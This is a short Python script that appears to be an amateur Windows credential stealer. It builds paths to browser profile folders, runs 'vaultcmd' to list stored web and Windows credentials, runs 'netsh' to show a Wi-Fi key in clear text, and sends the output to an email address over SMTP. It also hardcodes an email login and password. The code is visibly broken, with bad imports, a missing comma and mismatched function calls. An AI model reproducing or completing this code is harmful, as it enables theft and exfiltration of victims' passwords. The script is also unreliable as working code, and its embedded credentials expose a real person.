import requests
import os
import subprocess
import pyautogui
import cV2
import smtplib
# import socket
# import sqlite3
# import win32crypt
# import math
# import datetime
# import json
# import platform
# import psutil
# import GPUtil
# import re
# import pandas
# import shutil
# import zipfile

def GetPath():
    print("Getting Current working directory...")
    print(os.getcwd())
    print()

def GetCreds():
    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')

    paths = {

    'Google Chrome': local + '\\Google\\User Data\\Default',
    'Opera': roaming +  '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera GX Software\\Opera GX Stable',
    'Brave': local + '\\Brave Software\\Brave-Browser\\User Data\\Default'
    'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'

    }

    def SendMail():

        email = "jt.avina@icloud.com"
        password = "Jtavina112601!"

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.SendMail(email, email, message)
        server.quit()


command1 = "vaultcmd /listcreds:'Web Credentials' /all";
command2 = "vaultcmd /listcreds:'Windows Credentials' /all";

WifiName = input("Whats your Wifi Name? >")
WifiPass = "netsh wlan show profile " + WifiName + " key=clear"

result1 =subprocess.check_output(WifiName, shell=True)
reult2 = subprocess.check_output(WifiPass, shell=True)

SendMail(email, password, result1)
SendMail(email, password, result2)

subprocess.Popen(command1, shell=True)
subprocess.Popen(command2, shell=True)
